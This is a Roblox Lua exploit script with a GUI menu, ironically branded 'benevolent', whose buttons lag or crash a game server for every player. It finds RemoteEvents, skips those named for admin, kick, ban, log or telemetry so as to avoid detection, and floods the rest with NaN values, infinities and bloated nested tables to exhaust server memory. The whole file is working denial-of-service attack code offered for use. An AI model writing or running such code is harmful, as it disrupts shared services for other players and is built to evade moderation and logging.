--[[ 
    🔱 ARCANE VOID-STRIKE v2.1 [BENEVOLENT-STRIKE] 🔱
    "Because true protection requires a silent hammer. <3"
    
    SERVER-SIDE OPTIMIZATIONS:
    - Async Network Threading (Menu stays fluid)
    - Burst-Mode Packet Injection (Prevents local lag)
    - Recursive Table Bloating (Forces server memory overhead)
    - Intelligent Draggable UI (Always responsive)
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. NOTIFIER (Silent Style)
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 BENEVOLENT",
            Text = m,
            Duration = 3
        })
    end)
end

-- 2. UI (RESPONSIVE OMEGA)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "BenevolentDiagnostics_v1"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 240)
Main.Position = UDim2.new(0.5, -160, 0.5, -120)
Main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
Main.BorderSizePixel = 2
Main.BorderColor3 = Color3.fromRGB(0, 200, 255)
Main.Active = true
Main.Draggable = true -- Assure que le menu bouge même pendant le lag

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "🔱 VOID BENEVOLENT v2.1"
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Title.Font = Enum.Font.Code
Title.TextSize = 14

local function createActionBtn(name, y, color, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 45)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    btn.Text = name
    btn.TextColor3 = color
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.AutoButtonColor = true
    btn.MouseButton1Click:Connect(function()
        task.spawn(callback) -- Toujours asynchrone pour ne pas bloquer l'UI
    end)
    return btn
end

-- 3. THE BENEVOLENT ENGINE
local active = { lag = false, crash = false }

-- BLACKLIST (Safety First)
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getRemotes()
    local r = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(r, v) end
    end
    return r
end

-- [LAG SERVER] : Optimized for Synchronization
createActionBtn("⚡ LAG SERVER (GLOBAL)", 50, Color3.fromRGB(0, 255, 200), function()
    active.lag = not active.lag
    ntf(active.lag and "LAUNCHING SYNC LAG..." or "SYNC RECOVERED")
    
    if active.lag then
        local targets = getRemotes()
        while active.lag do
            -- On envoie par salves courtes avec de légères pauses
            -- pour laisser la connexion locale respirer tout en saturant le serveur
            for i = 1, 15 do
                local r = targets[math.random(1, #targets)]
                if r then pcall(function() r:FireServer(0/0, math.huge, string.rep("0", 100)) end) end
            end
            task.wait(0.15) -- Pause cruciale pour éviter le client-lag
        end
    end
end)

-- [CRASH SERVER] : Maximum Nuclear Density
createActionBtn("🔥 NUCLEAR CRASH (EVERYONE)", 105, Color3.fromRGB(255, 50, 50), function()
    active.crash = not active.crash
    ntf(active.crash and "NUCLEAR INJECTION START..." or "ABORTING...")
    
    if active.crash then
        local targets = getRemotes()
        -- On crée une table géante pour forcer l'allocation mémoire serveur
        local bloat = {}
        for i = 1, 100 do bloat[string.rep("A", i)] = 0/0 end
        
        while active.crash do
            for i = 1, 40 do -- Salves plus denses
                local r = targets[math.random(1, #targets)]
                if r then 
                    -- On envoie du NaN imbriqué dans des tables (difficile à filtrer)
                    pcall(function() r:FireServer(bloat, 0/0, math.huge, {["\0"] = bloat}) end) 
                end
            end
            RS.Heartbeat:Wait() -- On utilise le Heartbeat pour synchroniser avec la frame serveur
        end
    end
end)

-- EMERGENCY STOP
createActionBtn("🛑 EMERGENCY CLEANUP", 160, Color3.fromRGB(255, 255, 255), function()
    active.lag = false
    active.crash = false
    ntf("SYSTEM STABILIZED")
end)

ntf("🔱 VOID BENEVOLENT LOADED. Menu is fluid.")
